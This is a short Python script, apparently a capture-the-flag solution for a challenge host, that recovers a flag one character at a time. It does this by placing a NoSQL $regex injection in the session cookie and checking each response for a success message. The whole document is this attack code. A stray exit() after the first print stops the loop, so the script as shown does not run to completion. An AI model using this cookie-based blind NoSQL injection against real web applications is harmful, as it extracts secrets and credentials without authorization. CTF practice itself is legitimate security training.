import requests

url = "https://area51.chall.pwnoh.io/"
success_snippet = "<marquee><h1>Thank you for understanding!</h1></marquee>"
printable = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!&(),-=@^}~_'
flag = "bctf{"
status = 0
var = True

while (var):
    for char in printable:

        print(f"Trying char --> {char}")
        payload = f"{flag+char}"
        cookies = {
            'session': '{{"token":{{"$regex": "^{}"}},"username":"jumpyWidgeon1"}}'.format(payload)}
        print(cookies)
        exit()
        response = requests.get(url, cookies=cookies).text

        if success_snippet in response:
            flag += char
            print(f"Got flag --> {flag}")
            if char == "}":
                print(f"Flag done --> {flag}")
                status = 1
            break

    if (status):
        break
